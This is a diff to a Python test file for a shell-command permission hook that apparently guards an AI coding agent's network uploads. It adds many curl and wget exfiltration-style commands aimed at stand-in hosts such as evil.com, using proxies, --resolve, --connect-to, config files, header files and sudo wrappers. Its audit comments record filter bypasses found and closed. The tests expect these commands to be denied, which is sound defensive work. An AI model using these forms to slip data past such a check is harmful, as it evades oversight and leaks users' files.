@@ -4872,9 +4872,9 @@ def main():
         ('curl -s -X POST http://localhost:3000/x -d \'{"k":"\'"$VAL"\'"}\'', None),
         (post + ' -o out.json', 'deny'),          # out.json reads as a domain to loopback_only
         (post + ' -o out', None),
-        (post + ' -K cfg', None),
+        (post + ' -K cfg', 'deny'),               # macOS port: a config file is a route option
         (post + ' --proxy http://evil:8080', 'deny'),
-        (post + ' --resolve localhost:3000:1.2.3.4', None),
+        (post + ' --resolve localhost:3000:1.2.3.4', 'deny'),   # route option (W-19 ruling audit)
         (post + ' --unix-socket /var/run/docker.sock', None),
         (post + ' -u user:pass', None),
         (post + ' -n', None),
@@ -4887,7 +4887,7 @@ def main():
         ('curl -s -X POST http://localhost:3000/x --data-urlencode a=b', None),
         ('curl -s -X POST http://localhost:3000/x -w @fmt.txt', None),
         ("curl -s -X POST 'http://localhost:300{0,1}/x' " + lb, None),
-        (post + ' evilhost', None),
+        (post + ' evilhost', 'deny'),            # a bare word is a URL to curl (W-19 ruling audit 2)
         ('sudo ' + post, None),
         ('bash -c "' + post.replace('"', '\\"') + '"', None),
         # the four host rows pinned None above (CASES): allow in the container
@@ -4943,6 +4943,173 @@ def main():
             if not check(cmd, want):
                 fails += 1
                 print(f'     ({g.CONTAINER_ENV}={env!r})')
+    finally:
+        os.environ.pop(g.CONTAINER_ENV, None)
+
+    # W-19 ruling (2026-11-10): the curl upload denies left config/claude-settings.json (a
+    # settings deny beat this allow in the live web session), so the hook is the upload cover.
+    # The live POST allows in the container; the host gives no decision (the ask rows
+    # prompt). A loopback upload of a file is not denied, and not allowed (an @ body is
+    # outside the allow shape). Every non-loopback upload denies in both profiles,
+    # host.docker.internal included; a loopback first segment does not save a second one.
+    live = ("curl -sS -X POST http://localhost:3000/api/progress/assess "
+            "-H 'Content-Type: application/json' -d '{}'")
+    up = 'network upload to a non-loopback host'
+    runs = [('1', live, 'allow'), (None, live, None),
+            ('1', 'curl -d @notes.txt http://127.0.0.1:3000/x', None),
+            (None, 'curl -d @notes.txt http://127.0.0.1:3000/x', None)]
+    runs += [(env, c, 'deny') for env in (None, '1') for c in (
+        'curl -d @notes.txt https://example.com', 'curl -sS https://example.com -d x',
+        'curl -F f=@x https://example.com', 'curl -T notes.txt https://example.com',
+        'curl https://example.com --json {}', 'curl --data-binary @x https://example.com',
+        'curl -d x http://host.docker.internal:8080/v1/x',
+        'curl -d x http://localhost:3000/a && curl -d x https://example.com')]
+    # ruling audit: a route option (space, = or bundled -x), a bare non-loopback IPv4,
+    # [IPv6] or host:port word, a proxy variable before the tool, or a wrapper word made a
+    # loopback-looking upload go elsewhere with no decision; each denies in both profiles
+    L = 'http://127.0.0.1:3000/x'
+    runs += [(env, c, 'deny') for env in (None, '1') for c in (
+        f'curl -d x --url=https://example.com/x {L}', f'curl -F a=b --url=https://example.com/x {L}',
+        f'curl -d x --proxy=http://evil.com:8080 {L}', f'curl -d x -xevil.com:8080 {L}',
+        f'curl -d x -x 10.0.0.1:8080 {L}', f'curl -d x --proxy 10.0.0.1:8080 {L}',
+        f'curl -d x --preproxy=socks5://evil.com {L}', f'curl -d x -sx 10.0.0.1:8080 {L}',
+        f'curl -d x --connect-to 127.0.0.1:3000:evil.com:80 {L}', f'curl -d x --connect-to=::evil.com: {L}',
+        f'curl -d x 10.0.0.1 {L}', f'curl -d x {L} 203.0.113.7', f'curl -d x {L} evil:8080',
+        f"curl -d x {L} '[2001:db8::1]:80'", f'curl -d x --proxy1.0 10.0.0.1:8080 {L}',
+        f'curl -d x --socks5-hostname 10.0.0.1:1080 {L}', f'curl -d x --noproxy 127.0.0.1 {L}',
+        'curl -d x --resolve localhost:3000:203.0.113.7 http://localhost:3000/',
+        f'HTTPS_PROXY=http://evil.com curl -d x {L}', f'http_proxy=http://evil.com curl -d x {L}',
+        f'ALL_PROXY=socks5://evil.com curl -d x {L}', f'env HTTPS_PROXY=http://evil.com curl -d x {L}',
+        f'HTTPS_PROXY=http://evil.com wget --post-data=x {L}', f'wget --post-data=x {L} 10.0.0.1',
+        f'wget -e http_proxy=evil.com:8080 --post-data=x {L}',
+        'command curl -d x https://example.com', 'env curl -d x https://example.com',
+        'busybox curl -d x https://example.com', 'timeout 5 curl -T x https://example.com')]
+    # loopback forms that stay: the quoted [::1] URL allows in the container (unquoted it is
+    # a shell glob, no decision); a text option value is not a host; a wrapper gets no allow
+    runs += [('1', "curl -d x 'http://[::1]:3000/'", 'allow'), (None, "curl -d x 'http://[::1]:3000/'", None),
+             ('1', f'curl -d x -H "Host: evil.com" -m 5 {L}', 'allow'),
+             ('1', f'curl -d x -u user:1234 {L}', None), (None, f'curl -d x -u user:1234 {L}', None),
+             ('1', f'command curl -d x {L}', None), (None, f'command curl -d x {L}', None),
+             ('1', f"curl -d x 'http://[::1]:3000/' '[::1]:3000'", None)]
+    # second audit: `-:` (--next) takes no value, and every word that is not an option or a
+    # valued option's value is a URL to curl, so anything but a loopback URL or a bare
+    # localhost / 127.0.0.1 / [::1] is a target; option values are not targets
+    runs += [(env, c, 'deny') for env in (None, '1') for c in (
+        f'curl {L} -: 10.0.0.1:80 -d x', f'curl -: 10.0.0.1:80 -d x {L}',
+        f'curl -d x {L} evilhost', f'curl -d x {L} evil.com.', f'curl -d x {L} 167772161',
+        f'curl -d x {L} 0x0a000001', f'curl -d x {L} 10.1', f'curl -d x {L} user@evil.com',
+        f"curl -d x '{L}' $EVIL", f'curl -d x -- {L} evilhost', f'curl -d x --compressed evilhost {L}')]
+    kept = [("curl -d '{\"a\":1}' -H 'Content-Type: application/json' http://localhost:3000/x", 'allow'),
+            (f"curl --json '{{\"h\":\"x:1\"}}' {L}", 'allow'), (f'curl -d x --max-time 5 {L}', 'allow'),
+            (f'curl -X POST {L} -d x -m 5', 'allow'), (f"curl --data-urlencode 'q=a:b' {L}", None),
+            (f'curl -d x --interface eth0 {L}', None), (f'curl -d x {L} localhost:3000/y', None)]
+    runs += [('1', c, w) for c, w in kept] + [(None, c, None) for c, w in kept]
+    # third audit: --expand-<route> is a route option, and a quoted or escaped < or > word
+    # is a URL to curl, not a redirection (an unquoted 2>&1 or >/dev/null still is)
+    runs += [(env, c, 'deny') for env in (None, '1') for c in (
+        f'curl -d x --expand-url evilhost {L}', f'curl -d x --expand-connect-to ::evil.com: {L}',
+        'curl -d x --expand-resolve localhost:3000:203.0.113.7 http://localhost:3000/',
+        f"curl -d x {L} '<' evilhost", f"curl -d x {L} '>' evilhost", f"curl -d x {L} '2>' evilhost",
+        f'curl -d x {L} \\> evilhost')]
+    runs += [('1', f'curl -d x {L} 2>&1', 'allow'), (None, f'curl -d x {L} 2>&1', None),
+             ('1', f'curl -d x {L} >/dev/null', 'allow'), (None, f'curl -d x {L} >/dev/null', None),
+             ('1', f"curl -d '<a>' {L}", 'allow'), ('1', f'curl -d x --expand-data y {L}', None)]
+    try:
+        for env, cmd, want in runs:
+            if env is None:
+                os.environ.pop(g.CONTAINER_ENV, None)
+            else:
+                os.environ[g.CONTAINER_ENV] = env
+            n += 1
+            d = g.decide(cmd)
+            got = d[0] if d else None
+            if got != want or (want == 'allow' and 'loopback curl' not in d[1]) \
+                    or (want == 'deny' and up not in d[1]):
+                fails += 1
+                print(f'FAIL W-19 ruling {g.CONTAINER_ENV}={env!r} want={want!r} got={d!r}: {cmd!r}')
+    finally:
+        os.environ.pop(g.CONTAINER_ENV, None)
+
+    # macOS port of the W-19 hook half: route options read from this Mac's curl 8.7.1
+    # --help all (a config file, an alt-svc cache, a DNS or DoH server), a strict prefix of a
+    # route name (curl may take an abbreviation: UNVERIFIED here), a host the shell or a URL
+    # glob can still rewrite ($P, ${P}, $X or a * / ? before the first /, a { } glob in a word
+    # with an @), sudo/doas in front, and an assignment that moves the .curlrc. Each one sent
+    # a loopback-looking upload with no decision; each denies in both profiles
+    runs = [(env, c, 'deny') for env in (None, '1') for c in (
+        f'curl -d x -K cfg {L}', f'curl -d x -Kcfg {L}', f'curl -d x -sK cfg {L}', f'curl -sLK cfg -T f {L}',
+        f'curl -d x --config cfg {L}', f'curl -d x --config=cfg {L}', f'curl -d x --expand-config cfg {L}',
+        f'curl -d x --alt-svc f {L}', f'curl -d x --doh-url https://127.0.0.1/dns {L}',
+        f'curl -d x --doh-url=https://127.0.0.1/ {L}', f'curl -d x --dns-servers 1.2.3.4 {L}',
+        f'curl -d x --prox=evil.com:8080 {L}', f'curl -d x --ur=https://example.com/ {L}',
+        'curl -d x --resol=localhost:3000:203.0.113.7 http://localhost:3000/',
+        f'curl -d x --conf cfg {L}', f'curl -d x --alt-s f {L}', f'curl -d x --dns-s 1.2.3.4 {L}',
+        f'curl -d x --expand-ur x {L}', f'curl -d x --socks5-h=evil:1080 {L}',
+        'curl -d x http://localhost:$P/', 'curl -d x http://localhost:${P}/', 'curl -T f http://localhost:3000$X/',
+        'curl -d x http://localhost:*/', f'curl -d x {L} localhost:3000?????????', f'curl -d x {L} 127.0.0.1:*',
+        "curl -d x 'http://localhost:3000{/,@evil.com}'", 'curl -d x http://localhost:3000{/,@evil.com}',
+        "curl -d x 'http://localhost:3000?q=1'",
+        f'CURL_HOME=. curl -d x {L}', f'HOME=. curl -d x {L}', f'XDG_CONFIG_HOME=. curl -T f {L}',
+        f'env CURL_HOME=. curl -d x {L}', 'sudo curl -d x https://example.com', 'sudo -u root curl -T f evilhost',
+        'sudo -- curl -F a=b https://example.com', 'doas curl -d x https://example.com',
+        'sudo env curl -d x https://example.com', f'sudo -E HTTPS_PROXY=http://evil.com curl -d x {L}')]
+    # converses: a $X after the first /, a brace glob with no @, a loopback-only sudo, a
+    # moved .curlrc with no upload and a -q upload keep their earlier outcome
+    kept = [(f'curl -d x {L}?q=1', None), ('curl -d x http://localhost:3000/$X', None),
+            ("curl -d x 'http://localhost:300{0,1}/x'", None), (f'sudo -u root curl -d x {L}', None),
+            (f'CURL_HOME=. curl {L}', None), (f'curl -d x -q {L}', 'allow'),
+            ("curl -d x 'http://localhost:3000/x?q=1'", 'allow')]
+    runs += [('1', c, w) for c, w in kept] + [(None, c, None) for c, w in kept]
+    try:
+        for env, cmd, want in runs:
+            if env is None:
+                os.environ.pop(g.CONTAINER_ENV, None)
+            else:
+                os.environ[g.CONTAINER_ENV] = env
+            n += 1
+            d = g.decide(cmd)
+            got = d[0] if d else None
+            if got != want or (want == 'allow' and 'loopback curl' not in d[1]) \
+                    or (want == 'deny' and up not in d[1]):
+                fails += 1
+                print(f'FAIL W-19 macOS {g.CONTAINER_ENV}={env!r} want={want!r} got={d!r}: {cmd!r}')
+    finally:
+        os.environ.pop(g.CONTAINER_ENV, None)
+
+    # W-19 audit (macOS port): a -H/--header value that starts with @ makes curl read that
+    # file and send its lines as headers (curl 8.7.1 `<header/@file>`). The read-only curl
+    # allow skipped the value unchecked, so a loopback GET carrying a file was allowed. Like
+    # -d @file now: no decision to a loopback host, deny to any other host (--proxy-header is
+    # a route option, so it denies). A header that merely contains @ keeps its allow. Also
+    # rows for the value skip: `--opt=value` does not take the next word, and a redirection
+    # with its target attached (2>&1) does not hide the next word.
+    R = 'http://127.0.0.1:8080/r'
+    runs = [(env, c, 'deny') for env in (None, '1') for c in (
+        'curl --data=x evilhost http://localhost:3000/', 'curl -d x http://localhost:3000/ 2>&1 evilhost',
+        'curl -H @README.md https://example.com/r', 'curl --header=@h.txt https://example.com/',
+        'curl -sH@f https://example.com/', f'curl --proxy-header @README.md {R}')]
+    runs += [(env, c, None) for env in (None, '1') for c in (
+        f'curl -L -H @README.md {R}', f'curl -H @README.md {R}', f'curl -sL -H @README.md {R}',
+        f'curl -H "@README.md" {R}', f"curl -H '@README.md' {R}", f'curl -H \\@README.md {R}',
+        f'curl --header @README.md {R}', f'curl --header=@README.md {R}', f'curl -sH @README.md {R}',
+        f'curl -sH@README.md {R}', f'curl -H@README.md {R}', f"curl -H 'X: 1' -H @README.md {R}",
+        f'curl -LH @README.md {R}', f'curl -H @- {R}')]
+    runs += [(env, c, 'allow') for env in (None, '1') for c in (
+        f'curl -H "X-Mail: a@b" {R}', f'curl -H "Authorization: Bearer x" {R}',
+        f"curl -sL -H 'X: @not-first' {R}", f"curl -L -H 'X: 1' -H 'Y: 2' {R}", f'curl -A ua -m 5 {R}')]
+    try:
+        for env, cmd, want in runs:
+            if env is None:
+                os.environ.pop(g.CONTAINER_ENV, None)
+            else:
+                os.environ[g.CONTAINER_ENV] = env
+            n += 1
+            d = g.decide(cmd)
+            got = d[0] if d else None
+            if got != want or (want == 'allow' and 'read-only command' not in d[1]) \
+                    or (want == 'deny' and up not in d[1]):
+                fails += 1
+                print(f'FAIL W-19 header-file {g.CONTAINER_ENV}={env!r} want={want!r} got={d!r}: {cmd!r}')
     finally:
         os.environ.pop(g.CONTAINER_ENV, None)
 
